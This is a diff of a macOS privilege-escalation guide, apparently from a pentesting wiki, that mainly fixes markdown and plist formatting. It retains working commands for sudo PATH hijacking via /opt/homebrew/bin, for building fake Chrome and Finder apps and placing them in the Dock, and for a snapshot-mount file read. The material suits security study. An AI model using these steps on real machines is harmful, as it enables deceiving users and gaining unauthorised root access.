@@ -1,6 +1,5 @@
 # macOS Privilege Escalation
 
-
 ## TCC Privilege Escalation
 
 If you came here looking for TCC privilege escalation go to:
@@ -17,7 +16,7 @@ Please note that **most of the tricks about privilege escalation affecting Linux
 
 ### Sudo Hijacking
 
-You can find the original [[../../linux-hardening/privilege-escalation/index.html#sudo-hijacking|Sudo Hijacking technique inside the Linux Privilege Escalation post]].
+You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
 However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
 
@@ -35,7 +34,7 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-```
+
 Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
 
 ### Dock Impersonation
@@ -88,22 +87,22 @@ cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    CFBundleExecutable
-    Google Chrome
-    CFBundleIdentifier
-    com.google.Chrome
-    CFBundleName
-    Google Chrome
-    CFBundleVersion
-    1\.0
-    CFBundleShortVersionString
-    1\.0
-    CFBundleInfoDictionaryVersion
-    6\.0
-    CFBundlePackageType
-    APPL
-    CFBundleIconFile
-    app
+    <key>CFBundleExecutable</key>
+    <string>Google Chrome</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.google.Chrome</string>
+    <key>CFBundleName</key>
+    <string>Google Chrome</string>
+    <key>CFBundleVersion</key>
+    <string>1.0</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+    <key>CFBundleInfoDictionaryVersion</key>
+    <string>6.0</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+    <key>CFBundleIconFile</key>
+    <string>app</string>
 </dict>
 </plist>
 EOF
@@ -112,10 +111,9 @@ EOF
 cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns
 
 # Add to Dock
-defaults write com.apple.dock persistent-apps -array-add 'tile\-datafile\-data\_CFURLString/tmp/Google Chrome.app\_CFURLStringType0</dict></dict>'
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 sleep 0.1
 killall Dock
-```
 ```
 
 **Finder Impersonation**
@@ -168,22 +166,22 @@ cat << EOF > /tmp/Finder.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    CFBundleExecutable
-    Finder
-    CFBundleIdentifier
-    com.apple.finder
-    CFBundleName
-    Finder
-    CFBundleVersion
-    1\.0
-    CFBundleShortVersionString
-    1\.0
-    CFBundleInfoDictionaryVersion
-    6\.0
-    CFBundlePackageType
-    APPL
-    CFBundleIconFile
-    app
+    <key>CFBundleExecutable</key>
+    <string>Finder</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.finder</string>
+    <key>CFBundleName</key>
+    <string>Finder</string>
+    <key>CFBundleVersion</key>
+    <string>1.0</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+    <key>CFBundleInfoDictionaryVersion</key>
+    <string>6.0</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+    <key>CFBundleIconFile</key>
+    <string>app</string>
 </dict>
 </plist>
 EOF
@@ -192,12 +190,10 @@ EOF
 cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns
 
 # Add to Dock
-defaults write com.apple.dock persistent-apps -array-add 'tile\-datafile\-data\_CFURLString/tmp/Finder.app\_CFURLStringType0</dict></dict>'
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 sleep 0.1
 killall Dock
 ```
-```
-
 
 ## TCC - Root Privilege Escalation
 
@@ -225,14 +221,12 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-```
-A more detailed explanation can be [[https://theevilbit.github.io/posts/cve_2020_9771/|**found in the original report**]]**.**
+
+A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
 ## Sensitive Information
 
 This can be useful to escalate privileges:
 
 [[macos-files-folders-and-binaries/macos-sensitive-locations.md]]
-
-
 
